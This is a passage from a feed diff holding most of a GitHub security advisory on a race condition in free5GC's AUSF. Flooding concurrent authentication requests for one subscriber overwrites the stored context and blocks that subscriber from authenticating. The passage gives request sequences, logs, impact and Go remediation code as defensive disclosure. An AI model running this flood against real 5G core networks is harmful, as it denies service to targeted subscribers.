-<th>Request</th>
-<th>Vector class</th>
-<th>XRES</th>
-<th>Effect</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1st</td>
-<td>LEGIT</td>
-<td><code>0102030405060708</code></td>
-<td>response client computes AT_MAC with <code>K_aut_LEGIT</code></td>
-</tr>
-<tr>
-<td>2nd and later</td>
-<td>ATTACK</td>
-<td><code>deadbeefcafe0000</code></td>
-<td>flood overwrites AUSF context with <code>K_aut_ATTACK</code></td>
-</tr>
-</tbody></table>
-<p>Baseline without flood:</p>
-<pre><code class="language-text">POST /ue-authentications
-  -&gt; EapID=120, context with K_aut_LEGIT stored
-
-POST /eap-session with AT_MAC(K_aut_LEGIT)
-  -&gt; AUSF log: Correct RES value, EAP-AKA' auth succeed
-  -&gt; HTTP 200, EAP success
-</code></pre>
-<p>Race condition run:</p>
-<pre><code class="language-text">POST /ue-authentications
-  -&gt; EapID=243, context with K_aut_LEGIT stored
-
-20 concurrent POST /ue-authentications requests for the same SUCI
-  -&gt; 20/20 accepted
-  -&gt; K_aut_ATTACK overwrites K_aut_LEGIT in UePool
-
-POST /eap-session with AT_MAC(K_aut_LEGIT)
-  -&gt; AUSF validates against K_aut_ATTACK
-  -&gt; AUSF log: EAP-AKA' failure: EAP-AKA' integrity check fail
-  -&gt; HTTP 200, EAP notification failure
-</code></pre>
-<p>Critical AUSF log excerpt:</p>
-<pre><code class="language-text">Add SuciSupiPair (suci-0-001-01-0-0-0-0000000002, imsi-001010000000002) to map.
-... repeated for the same SUCI/SUPI ...
-EapAuthComfirmRequest
-[WARN] EAP-AKA' failure: EAP-AKA' integrity check fail
-| 200 | 127.0.0.1 | POST | /nausf-auth/v1/ue-authentications/.../eap-session |
-</code></pre>
-<p>Baseline and attack logs are in the private evidence bundle:</p>
-<pre><code class="language-text">hallazgos/finding13-ausf-auth-race/evidencia/20260527-195933-race-condition-p2-final/
-</code></pre>
-<p>The final PoC uses a Python client that constructs a protocol-valid synthetic EAP-AKA' response from known vectors. It is not a full UERANSIM/AMF trace, and the P2 run uses a mock UDM returning distinct LEGIT/ATTACK vectors to make the overwrite observable. The synthetic response is sufficient to prove the AUSF state bug because the baseline succeeds with the same client and vectors, while the flood run fails at the exact AT_MAC check predicted by the code.</p>
-<h3 id="impact">Impact</h3>
-<p>The confirmed impact is targeted denial of authentication service for a chosen SUPI.</p>
-<p>An attacker with access to the AUSF SBI/N12 interface can keep a subscriber from authenticating by continuously overwriting that subscriber's AUSF context. The AUSF process remains running; this is not a process crash and does not expose authentication material to the attacker. The availability impact is on the AUSF's primary security function for the targeted subscriber.</p>
-<p>In the default free5GC deployment observed in the lab, the AUSF reported OAuth2 disabled and listened on <code>0.0.0.0:8100</code>. In a production deployment with strict SBI isolation, mTLS, OAuth2, or firewalling, the attacker would need access to the internal SBA network or control of a network function that can send AUSF authentication requests.</p>
-<h3 id="suggested-remediation">Suggested remediation</h3>
-<p>The most robust fix is to stop using SUPI as the sole authentication-session key.</p>
-<p>Recommended design:</p>
-<ol>
-<li>Generate a unique session identifier for every authentication request.</li>
-<li>Store the <code>AusfUeContext</code> under that session identifier.</li>
-<li>Return the session identifier in the auth context URL.</li>
-<li>On <code>/eap-session</code> or <code>/5g-aka-confirmation</code>, retrieve the exact session context by session ID rather than by SUPI.</li>
-</ol>
-<p>Conceptual example:</p>
-<pre><code class="language-go">sessionID := uuid.New().String()
-ausfUeContext := ausf_context.NewAusfUeContext(sessionID)
-ausfUeContext.Supi = ueid
-// populate context...
-ausf_context.AddAusfUeContextToPool(ausfUeContext)
-
-// Return:
-// /nausf-auth/v1/ue-authentications/{sessionID}/eap-session
-</code></pre>
-<p>If the intended behavior is to allow only one active authentication procedure per SUPI, use an atomic check-and-insert operation and reject concurrent attempts explicitly:</p>
-<pre><code class="language-go">if existing, loaded := ausf_context.LoadOrStoreAusfUeContext(ueid, newCtx); loaded {
-    if existing.AuthStatus == models.AusfUeAuthenticationAuthResult_ONGOING {
-        c.JSON(http.StatusConflict, models.ProblemDetails{
-            Status: http.StatusConflict,
-            Cause:  "AUTHENTICATION_IN_PROGRESS",
-        })
-        return
-    }
-}
-</code></pre>
-<p>A mutex inside <code>AusfUeContext</code> alone is not sufficient if new requests are still allowed to replace the global map entry for the same SUPI.</p>
-<p>Additional hardening:</p>
-<ul>
-<li>Apply per-SUPI rate limiting on <code>POST /ue-authentications</code>.</li>
-<li>Enable and enforce OAuth2/mTLS for SBI access in deployments.</li>
-<li>Add tests for concurrent authentication requests targeting the same SUPI.</li>
-</ul>
-<h3 id="prior-art--non-duplication-note">Prior art / non-duplication note</h3>
-<p>Known related issues appear to be different:</p>
-<ul>
-<li>CVE-2026-33063 / GHSA-4jrw-92fg-4jwx affects free5GC AUSF, but concerns a nil interface conversion / DoS in <code>GetSupiFromSuciSupiMap</code>. It does not cover authentication context overwrite by concurrent requests.</li>
-<li>CVE-2026-44318 affects free5GC BSF and concerns a different concurrency issue in a different NF. It does not cover AUSF <code>UePool</code> authentication state keyed by SUPI.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-334q-h5g3-fpxv">https://github.com/free5gc/free5gc/security/advisories/GHSA-334q-h5g3-fpxv</a></li>
-<li><a href="https://github.com/advisories/GHSA-334q-h5g3-fpxv">https://github.com/advisories/GHSA-334q-h5g3-fpxv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-334q-h5g3-fpxv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-28T22:24:11.000Z</published>
     </entry>
 </feed>
